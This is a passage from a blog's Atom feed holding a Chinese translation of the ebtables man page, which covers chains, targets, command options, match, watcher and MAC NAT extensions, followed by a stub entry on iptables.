chain “head” 的 target 域来连接。</p><p><em>理解方式不重要，解决问题才重要。</em></p><p><strong>理解方式二：</strong> （这个才是正解）</p><p>内核中有三张内嵌有CHAINS的表。三张表按功能划分，每个功能（也就是表）中用该功能相适应的“规则”。每”一类规则“集就是一个chain。</p><p>如INPUT chain，OUTPUT chain 等，每一条 chain 都是有特定顺序的规则，用来依次做以太网帧的匹配。如果，某个以太网帧匹配到了一</p><p>条 chain 中的某一个规则，那么就对该帧执行这条规则上的 target 。如果这个帧没有匹配上这条规则，那么继续匹配改chain中的下一条规则，</p><p>用户可以扩展一条chain（创建一类新的规则集）然后使用内建的规则集（chain）的 target 域来连接。</p><br><p><strong>搞清楚上文的问号部分：什么是 brouter(‘before route’ or ‘bridge route’)，什么是转发状态的端口，什么是redirect，怎么理解broute</strong></p><ul><li>brouter 即 bridge router ，能桥接又能路由的路由器（目前大部分都是这样）</li><li>REDIRECT：会改变目标MAC地址，在BROUTING链里使用时，MAC地址被改为桥端口地址；在nat表的PREROUTING链中使用时，会改为网桥的地址</li><li>broute：即路由或者判断路由还是桥接的过程</li><li>转发状态的接口：被用来进行”端口转发”的网卡接口（interface）</li></ul><br><h3 id="TARGETS"><a href="#TARGETS" class="headerlink" title="TARGETS"></a>TARGETS</h3><p>1.ACCEPT<br>2.DROP - 丢，不通知<br>3.CONTINUE - 必须去匹配下一个规则（rule）<br>4.RETURN - 有点函数返回的意味。停止继续匹配这条 chain 上（采用理解方式二）的规则，转而去匹配从”调用“（通过target域调用）这条chain 的那个 chain 的下一条规则。<br>5.EXTENSION<br>6.jump to a user-defined chain</p><p>注： In the <strong>BROUTING</strong> chain however, the <strong>ACCEPT</strong> and <strong>DROP</strong> target have different meanings.</p><br><h3 id="ebtables-命令的使用及参数说明"><a href="#ebtables-命令的使用及参数说明" class="headerlink" title="ebtables 命令的使用及参数说明"></a>ebtables 命令的使用及参数说明</h3><p>注：一般一次只能输入一条命令，除非 <code>-L</code> 和 <code>-Z</code> 同时使用；或者<code>-N</code> <code>-P</code>同时使用；或者使用了<code>--atomic-file</code></p><p>-D, --delete</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-D start_nr[:end_nr] 或者-D complete-rule，可以使用负数</p><p>-C, --change-counters</p><p>-I, --insert</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-I rule [在某个特定的位置，一般是某一个chain的最开始]插入一条rule，如果现在某个chain已经有了N条规则，那么在 i（i&gt;0）出插入和在 i-N-1 处插入是一样的。当要一次性插入多条规则时，令 i 严格小于 0 是有好处的。</p><p>-P, --policy</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置chain的默认target，ACCEPT、DROP、RETURN</p><p>-F, --flush</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除非你指定一条chain，否则清除所有chain的规则</p><p>-Z, --zero</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除非你指定一条chain，否则设置所有chain的匹配计数为0，与-L连用时，会先print出已有的匹配计数</p><p>-L, --list</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除非你指定一条chain，否则所有chain的规则都列出来</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;–Ln 列出所有规则的rule number（即在chain中的序号），与–Lx不兼容</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;–Lc 在列出规则同时也展示匹配的帧的数量(pcnt)和字节计数(bcnt)，与–Lx配合时可以美化匹配计数的显示</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;–Lx </p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;–Lmac2 展示完整的mac地址</p><p>-N, --new-chain</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建一个自定义链，自定义链的最大名字长度为31个字符，默认target是ACCEPT，但可辅助以-P修改</p><p>-X, --delete-chain</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;删除一条没有被引用的用户自定义链，如果没有指定则删除所有没被引用的自定义chain</p><p>-E, --rename-chain</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以重命名自定义链或者内建的链，作用不是很大，如果更改则在提交问题的时候注意写明。</p><p>--init-table</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将当前table的数据用初始数据覆盖</p><p>--atomic-init</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将内核中保存的该table的原始数据保存到一个特定文件中去（相当于最初试的快照）</p><p>--atomic-save</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将内核中保存的该table的目前的数据保存到一个特定文件中去（相当于备份）</p><p>--atomic-commit</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以将一个特定文件中的数据提交到并覆盖内核中的数据</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>使用步骤：</strong></p><ol><li><p>先将使用 –atomic-init 或者 –atomic-save 产生的table数据文件使用<code>--atomic-file</code> 加载到当前的防火墙table</p></li><li><p>加载文件至防火墙table（此时还没刷新内核中的数据呢）还有另一途径就是：设置<em>EBTABLES_ATOMIC_FILE</em> 环境变量</p></li><li><p>使用<code>--atomic-commit</code> 提交并修改内核中的数据</p></li><li><p>在操作系统起始的 boot script 中十分有用，用来构建快速 ebtables</p></li></ol><br><p>-V, --version</p><p>-h, --help [list of module names]</p><p>-j, --jump <em>target</em></p><p>--atomic-file <em>file</em></p><p>-M, --modprobe <em>program</em> : 与内核交互时，使用 <em>program</em> 尝试自动加载某个缺失的内核模块</p><p>--concurrent : 设置一个锁防止脚本们并发地修改内核中维护的 ebtables 表</p><br><h3 id="规则说明"><a href="#规则说明" class="headerlink" title="规则说明"></a>规则说明</h3><p>-p, --protocol [!] <em>protocol</em></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创造出一个帧所使用的协议，可以是一个大于 0x0600 的16进制数 或<strong>长度</strong>。以太网帧的协议域可以用来指示头部的长度。当该域的值小于或等于 0x0600时，那么该值就等于帧头的大小并且不能被用作协议号。相反，所有协议域被用作长度域时的帧通常会被认为使用了“和那个长度对应”的协议。这些协议在这些帧中的名字就是长度(值) [<strong>LENGTH</strong>)，<code>/etc/ethertypes</code> 文件以人类可读的方式展示了协议及其的十六进制数字，和英文缩写。比如，<em>0x0800</em> 就表示IPV4协议。这个文件不是大小写敏感的，–proto 可以用来替换 -p</p><p>-i, --in-interface [!] <em>name</em></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;帧进来的接口(bridge port)，这个选项在 INPUT,FORWARD,PREROUTING,BROUTING链中有用。如果接口名字以’+’结尾，那么所有以该名字开头的接口都会被匹配，可以用 <code>--in-if</code>  替代</p><p>--logical-in [!] <em>name</em></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;帧进来的逻辑接口(如 eth0.1 这样的？)，生效于👆所提及的四条链，且+也同上。</p><p>-o, --out-interface [!] <em>name</em></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;帧要往哪个接口发出(bridge port)，这个选项在 OUTPUT,FORWARD,POSTROUTING链中有用。如果接口名字以’+’结尾，那么所有以该名字开头的接口都会被匹配，可以用 <code>--out-if</code>  替代</p><p>--logical-out [!] <em>name</em></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;定义帧要出去的逻辑接口(如 eth0.2 这样的？)，生效于👆所提及的四条链，且+也同上。</p><p>-s, --source [!] <em>address[/mask]</em></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;源MAC地址，掩码与地址都用6个被冒号分隔的十六进制表示。你可以手动指定如下这些：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Unicast = 00:00:00:00:00:00/01:00:00:00:00:00</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<em>Multicast</em>=01:00:00:00:00:00/01:00:00:00:00:00</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<em>Broadcast</em>=ff:ff:ff:ff:ff:ff/ff:ff:ff:ff:ff:ff</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<em>BGA</em>=01:80:c2:00:00:00/ff:ff:ff:ff:ff:ff</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：广播地址的帧也会和多播地址规则匹配，可以用 –src 来替代这个命令</p><p>-d, --destination [!] <em>address</em>[/mask]</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The destination MAC address. See -s (above) for more details on MAC addresses. The flag –dst is an alias for this option.</p><p>-c, --set-counter <em>pcnt bcnt</em></p><br><h3 id="扩展选项-EXTENSIONS"><a href="#扩展选项-EXTENSIONS" class="headerlink" title="扩展选项 EXTENSIONS"></a>扩展选项 EXTENSIONS</h3><p>注：无需向 iptables 那样使用 -m 来加载，ebtables 的内部实现里会自动加载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">未翻译部分：;;原因：本论文可能用不到</span><br><span class="line"></span><br><span class="line">802_3：</span><br><span class="line"></span><br><span class="line">Specify 802.3 DSAP/SSAP fields or SNAP type. The protocol must be specified as LENGTH (see the option -p above).</span><br><span class="line">--802_3-sap [!] sap</span><br><span class="line">DSAP and SSAP are two one byte 802.3 fields. The bytes are always equal, so only one byte (hexadecimal) is needed as an argument.</span><br><span class="line">--802_3-type [!] type</span><br><span class="line">If the 802.3 DSAP and SSAP values are 0xaa then the SNAP type field must be consulted to determine the payload protocol. This is a two byte (hexadecimal) argument. Only 802.3 frames with DSAP/SSAP 0xaa are checked for type.</span><br><span class="line"></span><br><span class="line">ip6 - 未翻译</span><br><span class="line">stp - 未翻译</span><br></pre></td></tr></table></figure><p><br><strong>among</strong></p><p>将MAC地址或MAC/IP地址对和某个MAC地址列表（MAC/IP地址对列表）做匹配。</p><p>MAC地址或MAC/IP地址对 如：xx:xx:xx:xx:xx:xx[=yy.yy.yy.yy][,]</p><p>在该列表中出现同一MAC不同IP的时也是会正常做匹配的</p><p>--among-dst [!] <em>list</em> 对比MAC目的地址</p><p>--among-src [!] <em>list</em> 对比MAC源地址</p><p>--among-dts-file [!] <em>file</em> 以文件的方式做列表</p><p>--among-src-file [!] <em>file</em></p><br><p><strong>arp</strong></p><p>指定 (R)ARP 类型的包，前提是协议必须设置为 ARP 或 RARP</p><p>--arp-opcode [!] <em>opcode</em>   (R)ARP 的操作码（十六进制或字符串，查看帮助 <strong>ebtables -h arp</strong>）</p><p>--arp-htype [!] <em>hardware type</em>   硬件类型，可以是十六进制或字符串 “<em>Ethernet</em>“ (它的类型是1)。大多数的 (R)ARP 包都是以 <em>Ethernet</em> 作为硬件类型</p><p>--arp-ptype [!] <em>protocol type</em>   (R)ARP 所使用的协议类型，为十六进制或字符串 “<em>IPv4</em>“ (其表示为 <strong>0x0800</strong> )。大多数(R)ARP包都是 IPv4</p><p>--arp-ip-src [!] <em>address[/mask]</em>   指定 (R)ARP 的源IP地址</p><p>--arp-ip-des [!]  <em>address[/mask]</em>   目的IP地址</p><p>--arp-mac-des [!]  <em>address[/mask]</em>   目的MAC地址</p><p>--arp-mac-src [!]  <em>address[/mask]</em>   源MAC地址</p><p>[!] --arp-gratuitous   Checks for ARP gratuitous packets: checks equality of IPv4 source address and IPv4 destination address inside the ARP header</p><br><p><strong>ip</strong></p><p>指定 IPv4 类型的包，协议必须为 IPv4</p><p>--ip-source [!] <em>address[/mask]</em>   =====&gt; <em>–ip-src</em>   源IP地址</p><p>--ip-destination [!] <em>address[/mask]</em>   =====&gt; <em>–ip-dst</em>   目的IP地址</p><p>--ip-tos [!] <em>tos</em>    (type of service) =====&gt; 十六进制数 或 <strong>IPv4</strong></p><p>--ip-protocol [!] <em>protocol</em>   =====&gt; <em>–ip-proto</em>   指明协议</p><p>--ip-source-port [!] <em>prot1[:port2]</em>   =====&gt; <em>–ip-src</em>   源端口或端口范围：6(TCP) , 17(UDP) , 33(DCCP) , 132(SCTP) ，必须设定<code>--ip-protocol</code> 字段为对应协议；如果 <em>port1</em> 被省略了，那么代表0:port2；如果<em>port2</em> 被省略了，代表port1:65535；=====&gt; <em>–ip-sport</em></p><p>--ip-destination-port [!] <em>prot1[:port2]</em>  同上 =====&gt; <em>–ip-dport</em></p><br><p><strong>limit</strong></p><br><p><strong>vlan</strong></p><p>指定 802.1Q 标签控制信息（Tag Control Information） 字段。协议必须指定为 802_1Q(0x8100)</p><p>--vlan-id [!] <em>id</em>    指定 VLAN 的标识符 (identifier filed, VID)，十进制数 0-4095</p><p>--vlan-prio [!] <em>prio</em>   用户优先级域，十进制 0-7，VID 必须设置为 0 （“null VID”）或者不指定。</p><p>--vlan-encap [!] <em>type</em>   被封装后的以太网帧的长度（也就是类型），为从0x0000 到 0xFFFF的十六进制数，或者在<code>/etc/ethertypes</code> 文件中的字符串</p><br><h3 id="观察者扩展-WATCHER-EXTENSIONS"><a href="#观察者扩展-WATCHER-EXTENSIONS" class="headerlink" title="观察者扩展 WATCHER EXTENSIONS"></a>观察者扩展 WATCHER EXTENSIONS</h3><p>只向日志文件中记录通过的帧，不能进行操作</p><p><strong>log</strong></p><p>log 观察者只向 syslog 写入帧的描述性数据</p><p>--log 默认选项，采用<code>log-level=info,log-prefix=&quot;&quot;</code>设置，且不记录ip，不记录arp</p><p>--log-level <em>level</em>   设置日志（记录）等级，参考<strong>ebtables -h log</strong> ，默认为 <em>info</em></p><p>--log-prefix <em>text</em>   记录条目的前缀，方便查看记录文件的时候快速识别出哪些来自 ebtables</p><p>--log-ip   当带有ip协议的帧匹配到规则时会记录ip</p><p>--log-ip6</p><p>--log-arp   当带有 (r)arp 协议的帧匹配到规则的时候，记录arp信息</p><br><p><strong>nflog</strong></p><p>nflog 观察者会传递匹配的包给一个后台运行的进程（loaded loggin backend）来记录数据包。通常这个后端程序为 <code>nfnetlink_log</code> , 这个后端程序会通过 <em>netlink</em> 套接字（socket）向多播组内多播接受到底数据包（帧）。而且一个或多个用户空间的进程可以加入该多播组从而收到这些包。</p><br><p>--nflog    用默认设置记录</p><p>--nflog-group <em>nlgroup</em>   数据包所属的 netlink 组(1 - 2^32-1)(仅适用于nfnetlink_log)。默认为1</p><p>--nflog-prefix <em>prefix</em>   记录日志的前缀，同上文，最长30个字符</p><p>--nflog-range <em>size</em>   规定多少字节被拷贝到用户空间（只对nfnetlink_log有效），且一般 nfnetlink_log 实例会指定自己的范围，这个选项会覆盖那个选项。</p><p>--nflog-threshold <em>size</em>    发送到用户空间之前要在内核中排队的包的数量 (仅适用于nfnetlink_log)。值越大，每个包的开销就越少，但是会增加延迟，直到包到达用户空间。默认值是1。</p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ulog - 未翻译</span><br></pre></td></tr></table></figure><br><h3 id="目标扩展-TARGET-EXTENSIONS"><a href="#目标扩展-TARGET-EXTENSIONS" class="headerlink" title="目标扩展 TARGET EXTENSIONS"></a>目标扩展 TARGET EXTENSIONS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arpreply - 未翻译</span><br><span class="line">mark - 未翻译</span><br></pre></td></tr></table></figure><br><p><strong>dnat</strong></p><p>该动作(target)只能用在 BROUTING 链，和 nat 表的 PREROUTING、OUTPUT链。指定了目的MAC地址必须要被改变</p><p>--to-destination <em>address</em>   =====&gt; <strong>–to-dst</strong></p><p>--dnat-target <em>target</em>   指定了标准动作（target）。因为在 dnat 后 ebtables 还需要知道怎么处理一个被 dnated 的帧，默认是 <strong>ACCEPT</strong>， 将其设置为 <strong>CONTINUE</strong> 可以让你在同一个帧上使用多个动作扩展（multiple target extensions)。设置为 <strong>DROP</strong> 只在 BROUTING 链中有用，当然此时还不如用 redirect 更合理呢。还可以设置为 <strong>RETURN</strong> ，注意在 基础链（base chain，应该指的是最开头的链，因为内核不知道还往哪里返回了！）中使用 RETURN 是不允许的。</p><br><p><strong>redirect</strong></p><p>重定向目标（target，或译为动作）将把MAC目标地址更改为帧到达的桥接设备的目标地址。此 target 只能在broute表的BROUTING链和nat表的PREROUTING链中使用。在BROUTING链中，使用桥端口的MAC地址作为目标地址，在PREROUTING链中使用桥的MAC地址。</p><p>--redirect-target <em>target</em>   指定标准target。在MAC重定向之后，规则仍然必须给出一个标准目标，以便ebtables知道该做什么。默认目标是ACCEPT。而使用 CONTINUE 可以让您在同一帧上使用多个目标扩展。在BROUTING 链上使用 DROP 会让帧被路由。也允许使用 RETURN。注意，不允许在基链中使用RETURN。</p><br><p><strong>snat</strong></p><p>这个动作只能被用在 nat 表的 POSTROUTING 链，它指定源MAC地址必须被改变</p><p>--to-source <em>address</em>    =====&gt; <strong>–to-src</strong></p><p>--snat-target <em>target</em>    指定一个标准动作，除了不能使用 DROP 之外，其余与上文一样</p><p>--snat-arp    如果包是arp消息，并且arp头中的硬件地址长度为6字节，那么还需要更改arp头中的硬件源地址。</p><br>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以下内容翻译自 ebtables 的 Man 页&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>iptables</title>
    <link href="https://pwn4justice.github.io/2019/04/30/iptables/"/>
    <id>https://pwn4justice.github.io/2019/04/30/iptables/</id>
    <published>2019-04-29T16:02:46.000Z</published>
    <updated>2019-07-06T08:09:49.425Z</updated>
    
    <content type="html"><![CDATA[<p>原文地址：<code>http://www.zsythink.net/archives/tag/iptables/page/2/</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原文地址：&lt;code&gt;http://www.zsythink.net/archives/tag/iptables/page/2/&lt;/code&gt;&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
</feed>
